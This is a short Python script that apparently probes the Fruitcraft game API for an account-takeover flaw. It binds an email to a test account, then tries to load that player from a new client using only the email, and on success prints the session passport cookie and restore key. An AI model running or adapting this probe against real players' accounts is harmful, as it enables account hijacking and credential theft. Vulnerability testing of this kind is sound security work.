import sys, os, time, requests, json
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'api')))
from fruitcraft_client import FruitClient
import uuid

def main():
    print('Testing Account Recovery / Email Binding...')
    c1 = FruitClient()
    s1, d1 = c1.login(os.environ.get("TEST_ACC_1_KEY", "REDACTED_KEY_1"), os.environ.get("TEST_ACC_1_UDID", "REDACTED_UDID_1"))
    if not s1: return
    
    # 1. Bind an email to our account
    email = f'hacker_{int(time.time())}@fruitcraft.test'
    print(f'[+] Binding email {email}')
    res = c1.post('/player/setemail', {'email': email})
    print('SetEmail:', res)
    
    # 2. Can we login / recover using this email via loadPlayer?
    print('\n[+] Attempting to load player state using email')
    c2 = FruitClient()
    payload = {
        'udid': 'android_' + uuid.uuid4().hex[:16],
        'email': email,
        'game_version': '1.10.10755',
        'os_type': 2,
        'device_name': 'FruitClient_Bot',
        'os_version': '10',
        'model': 'FruitClient',
        'store_type': 'myket'
    }
    res2 = c2.post('/player/load', payload)
    if res2 and res2.get('status'):
        print('[!] SUCCESS! Account recovered using email without auth token or password.')
        print('Returned keys:', res2['data'].keys() if 'data' in res2 else res2)
        print('New Passport:', c2.session.cookies.get('FRUITPASSPORT'))
        print('New Restore Key:', res2.get('data', {}).get('restore_key'))
    else:
        print('[-] FAILED. Server rejected email login or needs verification.', res2)

if __name__ == '__main__':
    main()
